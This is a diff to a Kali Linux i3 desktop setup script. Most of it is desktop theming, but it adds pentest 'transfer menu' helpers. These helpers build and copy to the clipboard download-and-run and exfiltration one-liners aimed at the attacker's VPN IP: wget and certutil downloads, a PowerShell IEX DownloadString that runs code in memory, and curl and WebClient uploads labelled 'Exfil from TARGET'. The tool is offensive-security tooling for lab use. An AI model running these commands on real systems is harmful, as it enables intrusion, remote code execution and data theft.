@@ -13,7 +13,7 @@
 set -Eeuo pipefail
 
 readonly APP_NAME="ignite"
-readonly APP_VERSION="1.2"
+readonly APP_VERSION="1.3"
 readonly KALI_MIRROR="https://http.kali.org/kali"
 MODE=install
 INSTALL_DONUT=1
@@ -501,7 +501,7 @@ check_setup() {
     say 'FAILED: Rofi configuration is missing.'
     failed=1
   fi
-  for helper in kali-i3-named-terminal kali-i3-files-menu kali-i3-files-block kali-i3-code-block kali-i3-mousepad-block kali-i3-flameshot-block kali-i3-obsidian-block kali-i3-remmina-block kali-i3-shift-held kali-i3-launch kali-i3-resize kali-i3-battery-block kali-i3-power-block kali-i3-power-menu kali-i3-vpn-block kali-i3-terminal-theme kali-i3-session-start; do
+  for helper in kali-i3-named-terminal kali-i3-files-menu kali-i3-files-block kali-i3-code-block kali-i3-mousepad-block kali-i3-flameshot-block kali-i3-obsidian-block kali-i3-remmina-block kali-i3-shift-held kali-i3-launch kali-i3-resize kali-i3-battery-block kali-i3-power-block kali-i3-power-menu kali-i3-vpn-block kali-i3-terminal-theme kali-i3-session-start kali-i3-titlebar-menu kali-i3-transfer-menu px; do
     if [[ -f "$HOME/.local/bin/$helper" ]] && bash -n "$HOME/.local/bin/$helper"; then
       say "OK: $helper"
     else
@@ -692,7 +692,7 @@ else
   packages=(
     i3-wm i3blocks rofi xfce4-terminal thunar lxappearance zsh xfconf picom librsvg2-bin
     arc-theme papirus-icon-theme fonts-jetbrains-mono fonts-noto-color-emoji
-    feh dunst network-manager-applet lxpolkit open-vm-tools-desktop mousepad xclip
+    feh dunst network-manager-applet lxpolkit open-vm-tools-desktop mousepad xclip xdotool
     python3-gi code-oss seclists flameshot remmina curl ca-certificates
   )
   if [[ "$GUEST_ARCH" == arm64 ]]; then
@@ -738,7 +738,7 @@ floating_modifier $mod
 focus_follows_mouse no
 default_border pixel 2
 # Keep other apps minimal, but show each terminal's chosen name in its title bar.
-for_window [class="(?i)^xfce4-terminal$"] border normal 2
+for_window [class="(?i)^xfce4-terminal$"] border normal 2, title_format "%title  ⇄"
 # Open the file manager as a floating, centered window so it never splits the layout.
 for_window [class="(?i)^thunar$"] floating enable, move position center
 gaps inner 5
@@ -834,6 +834,8 @@ mode "resize" {
     bindsym Escape mode "default"
 }
 bindsym $mod+r mode "resize"
+# Right-click a terminal's title bar: rename or transfer menu.
+bindsym --border button3 exec --no-startup-id ~/.local/bin/kali-i3-titlebar-menu
 bindsym $mod+Shift+c reload
 bindsym $mod+Shift+r restart
 bindsym $mod+Shift+e exec --no-startup-id i3-msg exit
@@ -867,6 +869,206 @@ configuration {
     drun-display-format: "{name}";
 }
 ROFI_CONFIG
+
+cat > "$STAGE_DIR/config/phoenix-dmenu.rasi" <<'PHOENIX_DMENU'
+* {
+    bg:             #090b10f0;
+    bg-selected:    #be2945;
+    fg:             #e3e5ed;
+    fg-dim:         #6b6e7a;
+    fg-selected:    #fff3f5;
+    accent:         #d84a62;
+    ember:          #9f203f;
+    font:           "JetBrains Mono 9";
+}
+
+window {
+    anchor:         north west;
+    location:       north west;
+    width:          600px;
+    y-offset:       0px;
+    x-offset:       0px;
+    background-color: @bg;
+    border:         0;
+    border-color:   @accent;
+    border-radius:  0;
+    padding:        0;
+}
+
+mainbox {
+    background-color: transparent;
+    children:       [ inputbar, message, listview ];
+    spacing:        0;
+}
+
+inputbar {
+    background-color: #12141df0;
+    text-color:     @fg;
+    padding:        6px 12px;
+    children:       [ prompt, entry ];
+}
+
+prompt {
+    background-color: @ember;
+    text-color:     @fg-selected;
+    padding:        2px 8px;
+    border-radius:  3px;
+    margin:         0 8px 0 0;
+}
+
+entry {
+    background-color: transparent;
+    text-color:     @fg;
+    placeholder-color: @fg-dim;
+    padding:        2px 0;
+}
+
+message {
+    background-color: transparent;
+    padding:        4px 12px;
+}
+
+textbox {
+    background-color: transparent;
+    text-color:     @fg-dim;
+}
+
+listview {
+    background-color: transparent;
+    lines:          14;
+    scrollbar:      false;
+    padding:        2px 0;
+    fixed-height:   false;
+    dynamic:        true;
+}
+
+element {
+    background-color: transparent;
+    text-color:     @fg;
+    padding:        4px 12px;
+}
+
+element.selected.normal {
+    background-color: @bg-selected;
+    text-color:     @fg-selected;
+}
+
+element-text {
+    background-color: transparent;
+    text-color:     inherit;
+}
+
+element-icon {
+    enabled:        false;
+}
+PHOENIX_DMENU
+
+cat > "$STAGE_DIR/config/phoenix-transfer.rasi" <<'PHOENIX_TRANSFER'
+* {
+    bg:             #090b10;
+    bg-alt:         #12141d;
+    bg-selected:    #be2945;
+    fg:             #e3e5ed;
+    fg-dim:         #6b6e7a;
+    fg-selected:    #fff3f5;
+    accent:         #d84a62;
+    ember:          #9f203f;
+    border-color:   #be2945;
+    font:           "JetBrains Mono 11";
+}
+
+window {
+    width:          620px;
+    background-color: @bg;
+    border:         2px solid;
+    border-color:   @accent;
+    border-radius:  8px;
+    padding:        0;
+}
+
+mainbox {
+    background-color: @bg;
+    children:       [ inputbar, message, listview ];
+    spacing:        0;
+    padding:        0;
+}
+
+inputbar {
+    background-color: #12141d;
+    text-color:     @fg;
+    padding:        14px 16px;
+    children:       [ prompt, entry ];
+    border:         0 0 1px 0 solid;
+    border-color:   #1e2030;
+}
+
+prompt {
+    background-color: @ember;
+    text-color:     @fg-selected;
+    padding:        4px 10px;
+    border-radius:  4px;
+    margin:         0 10px 0 0;
+}
+
+entry {
+    background-color: transparent;
+    text-color:     @fg;
+    placeholder-color: @fg-dim;
+    padding:        4px 0;
+}
+
+message {
+    background-color: @bg;
+    border:         0;
+    padding:        6px 16px;
+}
+
+textbox {
+    background-color: @bg;
+    text-color:     @fg-dim;
+}
+
+listview {
+    background-color: @bg;
+    lines:          16;
+    scrollbar:      false;
+    padding:        6px 0;
+    fixed-height:   false;
+}
+
+element {
+    background-color: transparent;
+    text-color:     @fg;
+    padding:        8px 16px;
+}
+
+element.normal.normal {
+    background-color: transparent;
+    text-color:     @fg;
+}
+
+element.normal.active {
+    background-color: transparent;
+    text-color:     @accent;
+}
+
+element.selected.normal {
+    background-color: @bg-selected;
+    text-color:     @fg-selected;
+    border-radius:  0;
+}
+
+element.selected.active {
+    background-color: @bg-selected;
+    text-color:     @fg-selected;
+}
+
+element-text {
+    background-color: transparent;
+    text-color:     inherit;
+    highlight:      bold underline;
+}
+PHOENIX_TRANSFER
 
 cat > "$STAGE_DIR/config/i3blocks-config" <<'I3BLOCKS_CONFIG'
 [flameshot]
@@ -1385,6 +1587,294 @@ else
 fi
 VPN_BLOCK
 
+cat > "$STAGE_DIR/bin/kali-i3-titlebar-menu" <<'TITLEBAR_MENU'
+#!/usr/bin/env bash
+set -euo pipefail
+
+THEME="$HOME/.config/rofi/phoenix-transfer.rasi"
+DMENU_THEME="$HOME/.config/rofi/phoenix-dmenu.rasi"
+
+# Get focused window class + geometry from i3 tree.
+read -r focused_class win_x win_y win_w < <(i3-msg -t get_tree 2>/dev/null | python3 -I -c '
+import json, sys
+tree = json.load(sys.stdin)
+def find(n):
+    if n.get("focused"):
+        cls = (n.get("window_properties") or {}).get("class", "")
+        r = n.get("rect", {})
+        dr = n.get("deco_rect", {})
+        return cls, r.get("x",0), r.get("y",0), r.get("width",600)
+    for c in n.get("nodes", []) + n.get("floating_nodes", []):
+        res = find(c)
+        if res is not None: return res
+    return None
+r = find(tree)
+if r: print(r[0], r[1], r[2], r[3])
+else: print("" ,0, 0, 600)
+')
+[[ "$focused_class" =~ [Xx]fce4-terminal ]] || exit 0
+
+# Position rofi beneath the terminal's title bar, matching its width.
+POS="-no-show-icons -theme-str window{x-offset:${win_x}px;y-offset:${win_y}px;width:${win_w}px;}"
+
+# Step 1: action.
+action=$(printf 'Transfer\nRename\n' | rofi -dmenu -p '✦ Ph03n1x' -no-custom -theme "$DMENU_THEME" $POS) || exit 0
+
+if [[ "$action" == Rename ]]; then
+  name=$(rofi -dmenu -p 'New name' -theme "$DMENU_THEME" $POS </dev/null) || exit 0
+  [[ -z "$name" ]] && exit 0
+  focused_wid=$(xdotool getactivewindow 2>/dev/null) || exit 0
+  xdotool set_window --name "$name" "$focused_wid" 2>/dev/null
+  notify-send 'Ph03n1x' "Renamed to: $name" 2>/dev/null || true
+  exit 0
+fi
+
+# ── Transfer flow ──
+
+# Get attacker IP.
+ip=$(ip -4 -o address show dev tun0 2>/dev/null | awk 'NR==1{sub(/\/.*/, "", $4); print $4}')
+[[ -z "$ip" ]] && ip=$(ip -4 -o address show dev tailscale0 2>/dev/null | awk 'NR==1{sub(/\/.*/, "", $4); print $4}')
+if [[ -z "$ip" ]]; then
+  notify-send 'Ph03n1x Transfer' 'Connect tun0 or tailscale0 first.' 2>/dev/null || true
+  exit 1
+fi
+
+# Step 2: target OS.
+os=$(printf 'Linux\nWindows\n' | rofi -dmenu -p "Target" -no-custom -mesg "$ip" -theme "$DMENU_THEME" $POS) || exit 0
+
+# Step 3: filename.
+file=$(rofi -dmenu -p "File" -mesg "$os · $ip" -theme "$DMENU_THEME" $POS </dev/null) || exit 0
+[[ -z "$file" ]] && exit 0
+file=${file//$'\n'/}
+file=${file//$'\r'/}
+file=${file//$'\e'/}
+
+# Step 4: port.
+port=$(rofi -dmenu -p "Port (80)" -mesg "$os · $file · $ip" -theme "$DMENU_THEME" $POS </dev/null) || exit 0
+[[ -z "$port" ]] && port=80
+
+# Step 5: build commands.
+hp="${ip}:${port}"
+commands=()
+if [[ "$os" == Linux ]]; then
+  commands=(
+    "[YOU] python3 -m http.server ${port}"
+    "[YOU] impacket-smbserver share \$(pwd) -smb2support"
+    "[YOU] nc -lvnp ${port} < ${file}"
+    "[YOU] python3 -m uploadserver ${port}"
+    "─────────────────────"
+    "[TGT] wget http://${hp}/${file} -O ${file}"
+    "[TGT] curl http://${hp}/${file} -o ${file}"
+    "[TGT] fetch http://${hp}/${file}"
+    "[TGT] smbclient //${ip}/share -N -c 'get ${file}'"
+    "[TGT] nc ${ip} ${port} > ${file}"
+    "[TGT] cat < /dev/tcp/${ip}/${port} > ${file}"
+    "[TGT] python3 -c \"import urllib.request;urllib.request.urlretrieve('http://${hp}/${file}','${file}')\""
+    "[TGT] php -r \"file_put_contents('${file}',file_get_contents('http://${hp}/${file}'));\""
+    "─────────────────────"
+    "[EXF] curl -X POST http://${hp}/upload -F 'files=@${file}'"
+    "[EXF] base64 -w0 ${file}"
+  )
+else
+  commands=(
+    "[YOU] python3 -m http.server ${port}"
+    "[YOU] impacket-smbserver share \$(pwd) -smb2support"
+    "[YOU] impacket-smbserver share \$(pwd) -smb2support -user x -password x"
+    "[YOU] python3 -m uploadserver ${port}"
+    "─────────────────────"
+    "[TGT] certutil -urlcache -f http://${hp}/${file} ${file}"
+    "[TGT] iwr -uri http://${hp}/${file} -outfile ${file}"
+    "[TGT] (New-Object Net.WebClient).DownloadFile('http://${hp}/${file}','C:\\Windows\\Temp\\${file}')"
+    "[TGT] copy \\\\${ip}\\share\\${file} ."
+    "[TGT] net use \\\\${ip}\\share /u:x x && copy \\\\${ip}\\share\\${file} ."
+    "[TGT] bitsadmin /transfer j http://${hp}/${file} C:\\Windows\\Temp\\${file}"
+    "[TGT] curl http://${hp}/${file} -o C:\\Windows\\Temp\\${file}"
+    "[TGT] powershell -c \"wget http://${hp}/${file} -OutFile ${file}\""
+    "─────────────────────"
+    "[MEM] IEX(New-Object Net.WebClient).DownloadString('http://${hp}/${file}')"
+    "─────────────────────"
+    "[EXF] (New-Object Net.WebClient).UploadFile('http://${hp}/upload','${file}')"
+  )
+fi
+
+# Step 6: pick command, strip tag, copy to clipboard.
+selection=$(printf '%s\n' "${commands[@]}" | rofi -dmenu -p "Copy" -i -mesg "$os · $file · $ip:$port" -theme "$DMENU_THEME" $POS) || exit 0
+
+# Skip separators.
+[[ "$selection" == "────"* ]] && exit 0
+
+# Strip the [TAG] prefix.
+cmd="${selection#\[*\] }"
+
+printf '%s' "$cmd" | xclip -selection clipboard 2>/dev/null
+printf '%s' "$cmd" | xclip -selection primary 2>/dev/null
+notify-send 'Ph03n1x Transfer' "Copied — Ctrl+Shift+V to paste" 2>/dev/null || true
+TITLEBAR_MENU
+
+cat > "$STAGE_DIR/bin/kali-i3-transfer-menu" <<'TRANSFER_MENU'
+#!/usr/bin/env bash
+set -euo pipefail
+
+# ── Phoenix colours ──
+R='\033[38;5;196m'
+E='\033[38;5;202m'
+G='\033[38;5;214m'
+W='\033[1;37m'
+D='\033[38;5;244m'
+C='\033[38;5;45m'
+N='\033[0m'
+
+# Get attacker IP.
+ip=$(ip -4 -o address show dev tun0 2>/dev/null | awk 'NR==1{sub(/\/.*/, "", $4); print $4}')
+[[ -z "$ip" ]] && ip=$(ip -4 -o address show dev tailscale0 2>/dev/null | awk 'NR==1{sub(/\/.*/, "", $4); print $4}')
+if [[ -z "$ip" ]]; then
+  printf "${R}  No VPN — connect tun0 or tailscale0 first.${N}\n"
+  read -rsn1 -p "  Press any key to close..."
+  exit 1
+fi
+
+clear
+printf "\n${E}  ✦ Ph03n1x Transfer Menu${N}\n"
+printf "${D}  ──────────────────────────────────────────────${N}\n\n"
+
+# Step 1: target OS.
+printf "${G}  Target OS${N}\n"
+printf "  ${W}1${N}) Linux\n"
+printf "  ${W}2${N}) Windows\n\n"
+read -rp "$(printf "${E}  ▸${N} ")" os_choice
+case "$os_choice" in
+  1) os=Linux ;;
+  2) os=Windows ;;
+  *) exit 0 ;;
+esac
+
+# Step 2: filename.
+printf "\n${G}  Filename to transfer${N}\n"
+read -rp "$(printf "${E}  ▸${N} ")" file
+[[ -z "$file" ]] && exit 0
+
+# Step 3: port.
+printf "\n${G}  Port ${D}(Enter for 80)${N}\n"
+read -rp "$(printf "${E}  ▸${N} ")" port
+[[ -z "$port" ]] && port=80
+
+hp="${ip}:${port}"
+
+# Step 4: build commands.
+clear
+printf "\n${E}  ✦ Ph03n1x Transfer Menu${N}\n"
+printf "${D}  ──────────────────────────────────────────────${N}\n"
+printf "  ${D}Target:${N} ${W}${os}${N}  ${D}·${N}  ${D}File:${N} ${C}${file}${N}  ${D}·${N}  ${D}Port:${N} ${C}${port}${N}  ${D}·${N}  ${D}IP:${N} ${C}${ip}${N}\n"
+printf "${D}  ──────────────────────────────────────────────${N}\n"
+
+cmds=()
+n=0
+
+section() { printf "\n${R}  ── %s ──${N}\n" "$1"; }
+
+add() {
+  n=$(( n + 1 ))
+  cmds+=("$1")
+  printf "  ${G}%2d${N}) ${W}%s${N}\n" "$n" "$1"
+}
+
+if [[ "$os" == Linux ]]; then
+  section "Run on YOUR machine"
+  add "python3 -m http.server ${port}"
+  add "impacket-smbserver share \$(pwd) -smb2support"
+  add "nc -lvnp ${port} < ${file}"
+  add "python3 -m uploadserver ${port}"
+
+  section "Run on TARGET"
+  add "wget http://${hp}/${file} -O ${file}"
+  add "curl http://${hp}/${file} -o ${file}"
+  add "fetch http://${hp}/${file}"
+  add "smbclient //${ip}/share -N -c 'get ${file}'"
+  add "nc ${ip} ${port} > ${file}"
+  add "cat < /dev/tcp/${ip}/${port} > ${file}"
+  add "python3 -c \"import urllib.request;urllib.request.urlretrieve('http://${hp}/${file}','${file}')\""
+  add "php -r \"file_put_contents('${file}',file_get_contents('http://${hp}/${file}'));\""
+
+  section "Exfil from TARGET"
+  add "curl -X POST http://${hp}/upload -F 'files=@${file}'"
+  add "base64 -w0 ${file}"
+else
+  section "Run on YOUR machine"
+  add "python3 -m http.server ${port}"
+  add "impacket-smbserver share \$(pwd) -smb2support"
+  add "impacket-smbserver share \$(pwd) -smb2support -user x -password x"
+  add "python3 -m uploadserver ${port}"
+
+  section "Run on TARGET"
+  add "certutil -urlcache -f http://${hp}/${file} ${file}"
+  add "iwr -uri http://${hp}/${file} -outfile ${file}"
+  add "(New-Object Net.WebClient).DownloadFile('http://${hp}/${file}','C:\\Windows\\Temp\\${file}')"
+  add "copy \\\\${ip}\\share\\${file} ."
+  add "net use \\\\${ip}\\share /u:x x && copy \\\\${ip}\\share\\${file} ."
+  add "bitsadmin /transfer j http://${hp}/${file} C:\\Windows\\Temp\\${file}"
+  add "curl http://${hp}/${file} -o C:\\Windows\\Temp\\${file}"
+  add "powershell -c \"wget http://${hp}/${file} -OutFile ${file}\""
+
+  section "In-memory (no drop to disk)"
+  add "IEX(New-Object Net.WebClient).DownloadString('http://${hp}/${file}')"
+
+  section "Exfil from TARGET"
+  add "(New-Object Net.WebClient).UploadFile('http://${hp}/upload','${file}')"
+fi
+
+printf "\n${D}  ──────────────────────────────────────────────${N}\n"
+
+# Step 5: pick and copy.
+while true; do
+  printf "\n"
+  read -rp "$(printf "${E}  Pick a number to copy ${D}(q to quit)${E} ▸${N} ")" pick
+  [[ "$pick" == q || "$pick" == Q || -z "$pick" ]] && break
+  if [[ "$pick" =~ ^[0-9]+$ ]] && (( pick >= 1 && pick <= n )); then
+    cmd="${cmds[$((pick - 1))]}"
+    printf '%s' "$cmd" | xclip -selection clipboard 2>/dev/null
+    printf '%s' "$cmd" | xclip -selection primary 2>/dev/null
+    printf "  ${R}✓${N} Copied: ${W}%s${N}\n" "$cmd"
+  else
+    printf "  ${D}Invalid. Pick 1-%d or q.${N}\n" "$n"
+  fi
+done
+TRANSFER_MENU
+
+cat > "$STAGE_DIR/bin/px" <<'PX_MENU'
+#!/usr/bin/env bash
+set -euo pipefail
+
+R='\033[38;5;196m'
+E='\033[38;5;202m'
+G='\033[38;5;214m'
+W='\033[1;37m'
+D='\033[38;5;244m'
+N='\033[0m'
+
+printf "\n${E}  ✦ Ph03n1x${N}\n"
+printf "${D}  ────────────────────${N}\n"
+printf "  ${W}1${N}) Rename terminal\n"
+printf "  ${W}2${N}) Transfer menu\n"
+printf "  ${D}q${N}) Cancel\n\n"
+read -rsn1 -p "$(printf "${E}  ▸${N} ")" pick
+printf "\n"
+
+case "$pick" in
+  1)
+    read -rp "$(printf "${G}  New name: ${N}")" name
+    [[ -z "$name" ]] && exit 0
+    printf '\033]0;%s\007' "$name"
+    export KALI_I3_TERMINAL_TITLE="$name"
+    printf "${R}  ✓${N} Renamed to: ${W}%s${N}\n\n" "$name"
+    ;;
+  2)
+    transfer
+    ;;
+  *)
+    ;;
+esac
+PX_MENU
+
 cat > "$STAGE_DIR/bin/kali-i3-terminal-theme" <<'TERMINAL_THEME'
 #!/usr/bin/env bash
 set -euo pipefail
@@ -1599,6 +2089,8 @@ BACKUP_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/kali-i3-setup/backups/$(date -
 mkdir -p "$BACKUP_DIR"
 backup_one "$HOME/.config/i3/config"
 backup_one "$HOME/.config/rofi/config.rasi"
+backup_one "$HOME/.config/rofi/phoenix-dmenu.rasi"
+backup_one "$HOME/.config/rofi/phoenix-transfer.rasi"
 backup_one "$HOME/.config/i3blocks/config"
 backup_one "$HOME/.config/picom/picom.conf"
 backup_one "$HOME/.config/feroxbuster/ferox-config.toml"
@@ -1624,6 +2116,9 @@ for helper in "$STAGE_DIR"/bin/*; do
   install -m 0755 "$helper" "$HOME/.local/bin/$(basename "$helper")"
 done
 install -m 0644 "$STAGE_DIR/config/rofi-config.rasi" "$HOME/.config/rofi/config.rasi"
+install -m 0644 "$STAGE_DIR/config/phoenix-dmenu.rasi" "$HOME/.config/rofi/phoenix-dmenu.rasi"
+install -m 0644 "$STAGE_DIR/config/phoenix-transfer.rasi" "$HOME/.config/rofi/phoenix-transfer.rasi"
+ln -sf kali-i3-transfer-menu "$HOME/.local/bin/transfer"
 install -m 0644 "$STAGE_DIR/config/i3blocks-config" "$HOME/.config/i3blocks/config"
 install -m 0644 "$STAGE_DIR/config/picom.conf" "$HOME/.config/picom/picom.conf"
 install -m 0644 "$STAGE_DIR/config/ferox-config.toml" "$HOME/.config/feroxbuster/ferox-config.toml"
